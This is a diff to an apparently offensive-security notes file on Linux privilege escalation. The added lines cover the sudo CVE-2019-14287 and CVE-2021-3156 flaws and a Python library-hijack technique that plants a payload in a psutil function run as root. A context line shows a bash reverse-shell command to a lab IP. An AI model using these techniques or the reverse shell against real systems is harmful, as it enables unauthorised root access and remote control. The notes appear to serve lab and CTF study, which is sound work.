@@ -282,6 +282,41 @@ echo 'bash -i >& /dev/tcp/10.10.14.24/9696 0>&1' > payload
 
 ![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/d697b732-6b26-4a99-9d12-87a924c1ee5d)
 
+## Sudo exploits 
+
+### CVE-2019-14287
+
+Versions before 1.8.28. If a negative ID (-1) is entered at sudo, this results in processing the ID 0, which only the root has.
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/1f3a5ce2-5c1a-4b43-9132-0a0741f55830)
+
+### CVE-2021-3156
+A heap-based buffer overflow vulnerability. This security issue impacted specific versions of the sudo program:
+
+    Version 1.8.31, Ubuntu 20.04
+    Version 1.8.27, Debian 10
+    Version 1.9.2, Fedora 33
+
+## Python Abuse
+
+Notice python file with root privs able to be executed by user
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/b834748a-bfa3-4f3c-b6af-af6c51fd5077)
+
+
+Find the library and function that is called in the script. here psutil library is using virutal_memory function.
+
+```
+grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
+```
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/6bfe41f1-a826-4af6-85ce-00ff0a2ee0ed)
+
+Insert paload into the function
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/5f2645dc-5524-4083-b800-e61835a509f2)
+
+
 
 ## Linpeas
 
